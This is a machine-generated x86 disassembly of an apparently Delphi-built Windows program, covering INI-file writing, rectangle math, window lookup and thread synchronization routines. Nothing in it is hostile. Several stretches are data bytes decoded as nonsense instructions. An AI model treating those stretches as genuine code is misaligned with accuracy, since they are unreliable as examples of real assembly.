call sub_425b40
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
push [ ebp - 0x18 ]
push r-xdata
push 0x0
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
push [ ebp - 0x1c ]
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_44a1b8
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
inc ebx
dec esi
jne r-xdata
sub_4323c3
inc [ ecx ]
add [ eax ] al
add [ 0x53000000 ] bh
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_449db8
push eax
push 0x0
push 0x0
mov eax esi
call sub_449db8
push eax
call WritePrivateProfileStringW
test eax eax
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov [ esp ] eax
mov [ esp + 0x4 ] 0x11
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d44
call sub_448c38
sub_432420
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_449db8
push eax
push 0x0
mov eax edi
call sub_449db8
push eax
mov eax esi
call sub_449db8
push eax
call WritePrivateProfileStringW
pop edi
pop esi
pop ebx
retn
sub_43246c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4324a8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4324af
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_44a7e8
sub_4324bc
adc al 0x25
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
and eax 0xc0043
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
and eax 0xc0043
add [ eax ] al
mov esp 0x6c004324
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bh
and eax 0x265c0043
inc ebx
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bh
and eax 0x79900043
inc esp
add [ esi ] bh
inc ebx
add [ eax ] ch
inc ebx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
arpl [ ebx - 0x70 ] bp
add [ esi ] bh
inc ebx
inc ebx
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
add [ eax ] ch
inc ebx
add [ esi ] al
push esp
push ebx
je r-xdata
inc ebx
dec esp
imul esi [ ebx + 0x74 ] 0x88909090
and eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_4325b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4325f8
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4481b0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_43263c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_4245dc
mov eax esi
pop esi
pop ebx
retn
sub_432668
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43268d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432694
retn
sub_4327ff
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_432825
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43282c
retn
sub_432864
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov eax [ ebp + 0x8 ]
mov edi eax
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub dl 0x1
jb r-xdata
add ebx [ ebp - 0x10 ]
mov [ eax + 0x8 ] ebx
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x8 ]
sub edx ebx
mov [ eax ] edx
jmp r-xdata
dec dl
je r-xdata
add ebx [ ebp - 0xc ]
mov [ eax + 0xc ] ebx
jmp r-xdata
dec dl
je r-xdata
mov edx [ ebp - 0x4 ]
sub edx ebx
mov [ eax + 0x4 ] edx
jmp r-xdata
sub_4328c0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov edi ebx
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub dl 0x1
jb r-xdata
lea eax [ ebp - 0x10 ]
call sub_432a48
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp + 0x8 ]
call sub_44796c
add eax [ ebp - 0x10 ]
mov [ ebx + 0x8 ] eax
jmp r-xdata
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
call sub_432a48
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp + 0x8 ]
call sub_44796c
mov edx [ ebp - 0x8 ]
sub edx eax
mov [ ebx ] edx
jmp r-xdata
dec dl
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_432a50
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp + 0x8 ]
call sub_44796c
add eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
dec dl
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_432a50
mov [ ebp - 0x14 ] eax
fild [ ebp - 0x14 ]
fmul [ ebp + 0x8 ]
call sub_44796c
mov edx [ ebp - 0x4 ]
sub edx eax
mov [ ebx + 0x4 ] edx
jmp r-xdata
sub_432970
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov esi edx
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] ecx
lea eax [ esp + 0x14 ]
call sub_432a48
mov ebx eax
lea eax [ esp + 0x14 ]
call sub_432a50
mov esi eax
mov edi [ esp + 0xc ]
add edi [ esp + 0x4 ]
sar edi 0x1
jns r-xdata
mov ebp [ esp + 0x8 ]
add ebp [ esp + 0x10 ]
sar ebp 0x1
jns r-xdata
adc edi 0x0
lea eax [ esi + 0x1 ]
sar eax 0x1
jns r-xdata
adc ebp 0x0
add eax ebp
push eax
mov eax [ esp + 0x4 ]
push eax
sar esi 0x1
jns r-xdata
adc eax 0x0
mov edx ebp
sub edx esi
mov eax ebx
sar eax 0x1
jns r-xdata
adc esi 0x0
push eax
mov eax edi
pop ecx
sub eax ecx
lea ecx [ ebx + 0x1 ]
sar ecx 0x1
jns r-xdata
adc eax 0x0
add ecx edi
call sub_432a2c
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
adc ecx 0x0
sub_432a08
mov ecx [ eax ]
cmp ecx [ edx ]
jne r-xdata
xor eax eax
retn
mov ecx [ eax + 0x8 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
mov eax [ eax + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
mov al 0x1
retn
sub_432a8c
mov ecx [ edx ]
cmp ecx [ eax ]
jl r-xdata
xor eax eax
retn
cmp ecx [ eax + 0x8 ]
jge r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ eax + 0x4 ]
jl r-xdata
mov edx [ edx + 0x4 ]
cmp edx [ eax + 0xc ]
jl r-xdata
mov al 0x1
retn
sub_432ab0
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
push esi
mov edi esi
mov esi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ edx + 0x4 ]
jle r-xdata
mov [ esi ] eax
mov eax [ ebx + 0x8 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0xc ]
cmp eax [ edx + 0xc ]
jge r-xdata
mov [ esi + 0x8 ] eax
mov eax esi
call sub_432b10
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
mov [ esi + 0xc ] eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_447ae4
sub_432b40
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_432b5c
push ebx
mov ebx [ eax + 0x8 ]
mov ecx [ eax ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
add ebx ecx
mov [ edx ] ebx
mov ebx [ eax + 0xc ]
mov ecx [ eax + 0x4 ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
adc ebx 0x0
add ebx ecx
mov [ edx + 0x4 ] ebx
pop ebx
retn
adc ebx 0x0
sub_432b88
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_432bad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432bb4
retn
sub_432bc0
sbb [ ebx + eax * 2 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
sub al 0x43
add [ eax ] cl
add [ eax ] al
add al ah
push esi
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0xfffbb7f ] ah
das
inc ebx
add ah dh
das
inc ebx
add [ esi ] cl
push esp
push ebx
jns r-xdata
add [ 0x6e614854 ] cl
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x78 ] si
sub al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp + 0x140043 ] dl
add [ eax ] al
shr [ ebx ] 0x43
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + esi ] bh
inc ebx
add al dh
das
inc ebx
add ah dh
das
inc ebx
add [ eax + esi + 0x43 ] ch
inc ebx
jb r-xdata
outsb
je r-xdata
mov [ eax + 0xc ] ebx
je r-xdata
arpl [ eax + edx * 4 - 0x70 ] si
cld
sub al 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
sub eax 0x140043
add [ eax ] al
xor [ ebx + eax * 2 ] ch
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + esi ] bh
inc ebx
add al dh
das
inc ebx
add ah dh
das
inc ebx
add [ eax + esi + 0x43 ] ch
add [ esi ] al
push esp
inc ebp
jbe r-xdata
push 0x432d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2d ] dh
inc ebx
add [ eax ] ah
add [ eax ] al
add al al
sub eax [ ebx ]
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] al
xor al [ ebx ]
xor [ edx ] dh
inc ebx
add [ edx + esi ] bh
inc ebx
add [ eax ] dl
push esp
call sub_4015fc
mov eax [ eax + 0xc ]
pop edi
pop esi
pop ebx
retn
push 0x0
call sub_4015fc
mov eax [ eax + 0xc ]
push eax
call GetWindowThreadProcessId
mov edi eax
call GetCurrentThreadId
cmp edi eax
jne r-xdata
call sub_4015fc
mov ebx [ eax + 0xc ]
call sub_4015fc
cmp [ eax + 0xc ] 0x0
je r-xdata
or al 0x0
add [ eax ] al
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
nop
nop
nop
push 0x0
push r-xdata
push ebx
push esi
call FindWindowExW
mov ebx eax
call sub_4015fc
sub_432d84
push ebx
push esi
push edi
call sub_4015fc
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
call sub_4015fc
mov eax [ eax + 0xc ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor esi esi
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
call sub_4015fc
mov eax [ eax + 0xc ]
pop edi
pop esi
pop ebx
retn
push 0x0
call sub_4015fc
mov eax [ eax + 0xc ]
push eax
call GetWindowThreadProcessId
mov edi eax
call GetCurrentThreadId
cmp edi eax
jne r-xdata
mov esi 0xfffffffd
jmp r-xdata
push 0x0
push r-xdata
push ebx
push esi
call FindWindowExW
mov ebx eax
call sub_4015fc
mov [ eax + 0xc ] ebx
call sub_4015fc
mov ebx [ eax + 0xc ]
call sub_4015fc
cmp [ eax + 0xc ] 0x0
je r-xdata
xor ebx ebx
sub_432f3c
push ebx
push r-xdata
call GetModuleHandleW
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
pop ebx
retn
mov [ rw-data ] r-xdata
sub_432fbc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push ebx
call [ rw-data ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_432f3c
sub_432ff8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_448180
mov [ esi + 0xc ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_43303c
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
push eax
call CloseHandle
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_43306c
push ebx
push esi
push ecx
mov esi eax
cmp [ esi + 0xc ] 0x0
je r-xdata
push 0x0
push edx
push 0xffffffff
lea eax [ esi + 0x4 ]
push eax
push 0x1
call WaitForMultipleObjectsEx
sub eax 0xffffffff
je r-xdata
lea eax [ esi + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx 0x1
xor eax eax
call sub_432fbc
sub eax 0x80010115
je r-xdata
mov bl 0x3
call GetLastError
mov [ esi + 0x8 ] eax
jmp r-xdata
dec eax
je r-xdata
mov bl 0x4
jmp r-xdata
sub eax 0xa
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
sub eax 0x80
je r-xdata
mov bl 0x1
jmp r-xdata
sub eax 0x7ffefee1
jne r-xdata
mov bl 0x2
jmp r-xdata
sub eax 0x82
je r-xdata
mov bl 0x3
call GetLastError
mov [ esi + 0x8 ] eax
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
jmp r-xdata
mov bl 0x3
sub_433100
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
movzx ecx [ ebp + 0x8 ]
xor edx edx
mov eax edi
call sub_432ff8
mov eax [ ebp + 0xc ]
call sub_449db8
push eax
cmp [ ebp + 0x10 ] 0x1
cmc
sbb eax eax
push eax
cmp [ ebp + 0x14 ] 0x1
cmc
sbb eax eax
push eax
push esi
call CreateEventW
mov [ edi + 0x4 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_433168
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push 0x1
push 0x0
push 0x0
push ecx
xor edx edx
mov eax esi
xor ecx ecx
call sub_433100
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_4331c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448180
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_433200
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4481a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_433294
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_433308
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4332dd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4332ec
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4332e4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_433558
retn
sub_4332ec
mov eax [ edx ]
test eax eax
je r-xdata
xor ecx ecx
mov [ edx ] ecx
retn
cmp eax [ eax ]
jne r-xdata
mov eax [ edx ]
mov ecx [ eax ]
mov eax ecx
mov ecx [ ecx ]
mov edx [ edx ]
mov [ edx ] ecx
retn
sub_433308
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
mov eax [ rw-data ]
cmp [ eax ] 0x1
setg [ esp ]
cmp [ esp ] 0x0
je r-xdata
or edi 0xffffffff
mov edi 0xfa0
jmp r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test edi edi
jge r-xdata
mov ebx [ ebp ]
and ebx 0xfffffffe
mov esi ebx
push esi
mov eax esi
or eax 0x1
push eax
push ebp
call InterlockedCompareExchange
cmp eax esi
je r-xdata
pause
call SwitchToThread
cmp [ esp ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edi 0xfa0
jmp r-xdata
dec edi
jmp r-xdata
sub_43336c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_433308
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4333c6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebx ] eax
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebx ] ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4333cd
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_433558
retn
sub_4333d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
and eax 0xfffffffe
test eax eax
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_433308
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_433454
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov eax [ edx ]
cmp eax [ ebp - 0x8 ]
je r-xdata
cmp eax [ ebp - 0x8 ]
jne r-xdata
cmp eax ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_433558
retn
cmp eax ebx
jne r-xdata
mov edx eax
mov eax [ eax ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov ecx [ eax ]
mov [ edx ] ecx
jmp r-xdata
cmp eax [ eax ]
jne r-xdata
mov [ ebp - 0x8 ] edx
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
sub_433460
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
call GetCurrentThreadId
cmp eax [ ebx + 0xc ]
jne r-xdata
mov [ ebp - 0x5 ] 0x0
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventW
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_433541
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x8 ]
lea edx [ ebp - 0x14 ]
mov eax edi
call sub_43336c
mov [ ebx + 0x8 ] 0x1
mov eax esi
dec eax
neg eax
push eax
lea eax [ ebx + 0x4 ]
push eax
call InterlockedExchangeAdd
push ebx
call LeaveCriticalSection
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call WaitForSingleObject
sub eax 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub eax 0x101
jne r-xdata
push ebx
call EnterCriticalSection
lea edx [ ebp - 0x14 ]
mov eax edi
call sub_4333d4
mov eax esi
dec eax
push eax
lea eax [ ebx + 0x4 ]
push eax
call InterlockedExchangeAdd
mov [ ebx + 0x8 ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
mov [ ebp - 0x5 ] 0x0
push 0x0
call SetLastError
mov [ ebp - 0x5 ] 0x0
push 0x5b4
call SetLastError
jmp r-xdata
sub_433574
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_433308
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4335db
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4332ec
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4335e2
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_433558
retn
mov eax [ ebx + 0x8 ]
push eax
call SetEvent
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4332ec
mov ebx eax
test ebx ebx
jne r-xdata
sub_4335e8
push ebx
push r-xdata
call GetModuleHandleW
mov ebx eax
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_41d36c
mov [ rw-data ] eax
pop ebx
retn
mov [ rw-data ] sub_433248
mov [ rw-data ] sub_433258
mov [ rw-data ] sub_433268
mov [ rw-data ] sub_433278
pop ebx
retn
sub_433798
adc [ esi ] eax
push esp
inc edx
jns r-xdata
inc ebx
add [ eax ] ch
sahf
inc ebx
add [ esi + ebx * 4 ] bl
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
jae r-xdata
nop
outsd
outsb
nop
cmp [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add [ eax ] al
test [ esi + 0x44 ] dl
add [ eax ] cl
push ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ esi + edx * 2 + 0x53080044 ] al
test [ fs : eax + eax + 0x68 ] al
js r-xdata
